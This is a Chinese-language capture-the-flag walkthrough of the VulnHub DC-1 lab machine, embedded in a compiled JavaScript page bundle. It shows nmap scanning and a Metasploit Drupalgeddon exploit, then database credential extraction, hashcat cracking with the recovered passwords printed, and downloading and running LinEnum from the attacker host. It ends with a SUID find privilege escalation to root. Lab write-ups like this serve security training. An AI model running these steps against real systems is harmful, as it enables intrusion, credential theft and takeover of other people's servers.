(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{801:function(s,a,n){"use strict";n.r(a);var t=n(1),e=Object(t.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h2",{attrs:{id:"_0x01-部署"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-部署"}},[s._v("#")]),s._v(" 0x01 部署")]),s._v(" "),n("p",[s._v("靶机地址：")]),s._v(" "),n("blockquote",[n("p",[n("a",{attrs:{href:"https://www.vulnhub.com/entry/dc-1,292/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.vulnhub.com/entry/dc-1,292/"),n("OutboundLink")],1)])]),s._v(" "),n("p",[s._v("根据靶机说明，需要找到5个flag")]),s._v(" "),n("p",[s._v("下载镜像, 使用vmware打开, 网络选择NAT模式")]),s._v(" "),n("h2",{attrs:{id:"_0x02-信息收集"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-信息收集"}},[s._v("#")]),s._v(" 0x02 信息收集")]),s._v(" "),n("p",[s._v("nmap扫描网段")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[s._v("nmap -sP "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".190.0/24\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:"/assets/img/target/dc1.png",alt:"dc1"}}),n("br"),s._v("\n发现目标IP:"),n("code",[s._v("192.168.190.134")])]),s._v(" "),n("p",[s._v("进一步扫描端口")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[s._v("nmap -T5 -A -v -p- "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".190.134\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("扫描结果：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 17:38 CST\nHappy 24th Birthday to Nmap, may it live to be 124!\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating Ping Scan at 17:38\nScanning 192.168.190.134 [2 ports]\nCompleted Ping Scan at 17:38, 0.00s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 17:38\nCompleted Parallel DNS resolution of 1 host. at 17:38, 0.00s elapsed\nInitiating Connect Scan at 17:38\nScanning 192.168.190.134 [65535 ports]\nDiscovered open port 80/tcp on 192.168.190.134\nDiscovered open port 22/tcp on 192.168.190.134\nDiscovered open port 111/tcp on 192.168.190.134\nDiscovered open port 48247/tcp on 192.168.190.134\nCompleted Connect Scan at 17:38, 2.57s elapsed (65535 total ports)\nInitiating Service scan at 17:38\nScanning 4 services on 192.168.190.134\nCompleted Service scan at 17:38, 11.01s elapsed (4 services on 1 host)\nNSE: Script scanning 192.168.190.134.\nInitiating NSE at 17:38\nCompleted NSE at 17:39, 1.62s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.11s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nNmap scan report for 192.168.190.134\nHost is up (0.00019s latency).\nNot shown: 65531 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)\n| ssh-hostkey:\n|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)\n|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)\n|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)\n80/tcp    open  http    Apache httpd 2.2.22 ((Debian))\n|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC\n|_http-generator: Drupal 7 (http://drupal.org)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-robots.txt: 36 disallowed entries (15 shown)\n| /includes/ /misc/ /modules/ /profiles/ /scripts/\n| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt\n| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt\n|_/LICENSE.txt /MAINTAINERS.txt\n|_http-server-header: Apache/2.2.22 (Debian)\n|_http-title: Welcome to Drupal Site | Drupal Site\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          46013/udp   status\n|   100024  1          47802/tcp6  status\n|   100024  1          48247/tcp   status\n|_  100024  1          58175/udp6  status\n48247/tcp open  status  1 (RPC #100024)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNSE: Script Post-scanning.\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.83 seconds\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br")])]),n("p",[s._v("发现80端口，且运行的是Drupal")]),s._v(" "),n("h2",{attrs:{id:"_0x03-漏洞利用"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-漏洞利用"}},[s._v("#")]),s._v(" 0x03 漏洞利用")]),s._v(" "),n("p",[s._v("使用浏览器访问目标机80端口，确定运行Drupal")]),s._v(" "),n("p",[s._v("Drupal存在已知的可利用漏洞："),n("RouterLink",{attrs:{to:"/docs/web/cms/#drupal"}},[s._v("已知Drupal漏洞")]),s._v("，使用msf搜索drupal")],1),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/dc1.0.png",alt:"dc1.0"}})]),s._v(" "),n("p",[s._v("尝试使用后，使用 "),n("code",[s._v("exploit/multi/http/drupal_drupageddon")]),s._v(" 获得metaerpreter shell")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903095826691.png",alt:"image-20210903095826691"}})]),s._v(" "),n("h3",{attrs:{id:"flag1"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#flag1"}},[s._v("#")]),s._v(" flag1")]),s._v(" "),n("p",[s._v("执行"),n("code",[s._v("ls")]),s._v("发现flag1.txt，查看内容")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903100132779.png",alt:"image-20210903100132779"}})]),s._v(" "),n("h3",{attrs:{id:"flag2"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#flag2"}},[s._v("#")]),s._v(" flag2")]),s._v(" "),n("p",[s._v("根据flag1的内容，flag可能在drupal的配置文件中，执行"),n("code",[s._v("shell")]),s._v("获取shell后，执行"),n("code",[s._v('grep -Rn "flag2" *')]),s._v("发现flag2在"),n("code",[s._v("sites/default/settings.php")]),s._v("第5行，查看flag")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903102601943.png",alt:"image-20210903102601943"}})]),s._v(" "),n("h3",{attrs:{id:"flag3"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#flag3"}},[s._v("#")]),s._v(" flag3")]),s._v(" "),n("p",[s._v("flag2提示要通过认证，但是暴力破解不是唯一的方法。配置文件flag2的下面就是数据库配置，考虑通过进入数据库查看账号密码。")]),s._v(" "),n("p",[s._v("获取交互shell")]),s._v(" "),n("p",[n("code",[s._v("python -c 'import pty; pty.spawn(\"/bin/sh\")'")])]),s._v(" "),n("p",[s._v("通过"),n("code",[s._v("mysql -u dbuser -p")]),s._v("链接数据库")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903105023673.png",alt:"image-20210903105023673"}})]),s._v(" "),n("p",[s._v("进入drupaldb库，查看所有表")]),s._v(" "),n("p",[n("code",[s._v("use drupaldb")])]),s._v(" "),n("p",[n("code",[s._v("show tables")])]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("+-----------------------------+\n| Tables_in_drupaldb          |\n+-----------------------------+\n| actions                     |\n| authmap                     |\n| batch                       |\n| block                       |\n| block_custom                |\n| block_node_type             |\n| block_role                  |\n| blocked_ips                 |\n| cache                       |\n| cache_block                 |\n| cache_bootstrap             |\n| cache_field                 |\n| cache_filter                |\n| cache_form                  |\n| cache_image                 |\n| cache_menu                  |\n| cache_page                  |\n| cache_path                  |\n| cache_update                |\n| cache_views                 |\n| cache_views_data            |\n| comment                     |\n| ctools_css_cache            |\n| ctools_object_cache         |\n| date_format_locale          |\n| date_format_type            |\n| date_formats                |\n| field_config                |\n| field_config_instance       |\n| field_data_body             |\n| field_data_comment_body     |\n| field_data_field_image      |\n| field_data_field_tags       |\n| field_revision_body         |\n| field_revision_comment_body |\n| field_revision_field_image  |\n| field_revision_field_tags   |\n| file_managed                |\n| file_usage                  |\n| filter                      |\n| filter_format               |\n| flood                       |\n| history                     |\n| image_effects               |\n| image_styles                |\n| menu_custom                 |\n| menu_links                  |\n| menu_router                 |\n| node                        |\n| node_access                 |\n| node_comment_statistics     |\n| node_revision               |\n| node_type                   |\n| queue                       |\n| rdf_mapping                 |\n| registry                    |\n| registry_file               |\n| role                        |\n| role_permission             |\n| search_dataset              |\n| search_index                |\n| search_node_links           |\n| search_total                |\n| semaphore                   |\n| sequences                   |\n| sessions                    |\n| shortcut_set                |\n| shortcut_set_users          |\n| system                      |\n| taxonomy_index              |\n| taxonomy_term_data          |\n| taxonomy_term_hierarchy     |\n| taxonomy_vocabulary         |\n| url_alias                   |\n| users                       |\n| users_roles                 |\n| variable                    |\n| views_display               |\n| views_view                  |\n| watchdog                    |\n+-----------------------------+\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br")])]),n("p",[s._v("发现user表，查看表中信息")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903105329450.png",alt:"image-20210903105329450"}})]),s._v(" "),n("p",[s._v("这里通过hashcat破解密码，字典使用kali的rockyou.txt。")]),s._v(" "),n("p",[s._v("hashcat使用介绍："),n("RouterLink",{attrs:{to:"/docs/tools/hashcat.html"}},[s._v("hashcat使用")])],1),s._v(" "),n("p",[s._v("查询Drupal模式id")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903105827686.png",alt:"image-20210903105827686"}})]),s._v(" "),n("p",[s._v("执行破解")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\'),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$S")]),s._v("\\"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5")]),s._v('.i38jnEKuDR"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" hash.txt\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\'),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$S")]),s._v("\\"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$DWGrxef6")]),s._v('.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" hash.txt\nhashcat -m "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("7900")]),s._v(" -a "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" hash.txt /usr/share/wordlists/rockyou.txt \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("p",[s._v("耗时一小时40分钟破解完成，获得admin密码53cr3t，Fred密码MyPassword")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/dc1.1.png",alt:"dc1.1"}})]),s._v(" "),n("p",[s._v("使用admin账号登录，在Dashboard中发现flag3")]),s._v(" "),n("img",{staticStyle:{zoom:"80%"},attrs:{src:"/assets/img/image-20210903110313231.png",alt:"image-20210903110313231"}}),s._v(" "),n("h3",{attrs:{id:"flag4"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#flag4"}},[s._v("#")]),s._v(" flag4")]),s._v(" "),n("p",[s._v("根据flag3的提示，"),n("code",[s._v("cat /etc/passwd")])]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903110638671.png",alt:"image-20210903110638671"}})]),s._v(" "),n("p",[s._v("发现flag4用户，查看home下存在flag4.txt，查看内容获得flag4")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903110757247.png",alt:"image-20210903110757247"}})]),s._v(" "),n("h3",{attrs:{id:"flag5"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#flag5"}},[s._v("#")]),s._v(" flag5")]),s._v(" "),n("p",[s._v("根据flag4提示，通过同样方法在root下获取flag，尝试没有权限")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903110856064.png",alt:"image-20210903110856064"}})]),s._v(" "),n("p",[s._v("使用LineEnum提权")]),s._v(" "),n("p",[s._v("在kali上下载LineEnum，并启动一个HTTP服务")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/rebootuser/LinEnum.git\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" LinEnum\npython -m SimpleHTTPServer "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("p",[s._v("在目标机上下载LineEnumh后执行")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://192.168.190.129:8080/LinEnum.sh\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v(" LinEnum.sh\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("发现find可以利用")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903112212502.png",alt:"image-20210903112212502"}})]),s._v(" "),n("p",[s._v("执行")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v(" -exec /bin/sh "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" -quit\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("查看权限成功提权")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903112327340.png",alt:"image-20210903112327340"}})]),s._v(" "),n("p",[s._v("查看/root下flag文件，获得flag5")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210903112449541.png",alt:"image-20210903112449541"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);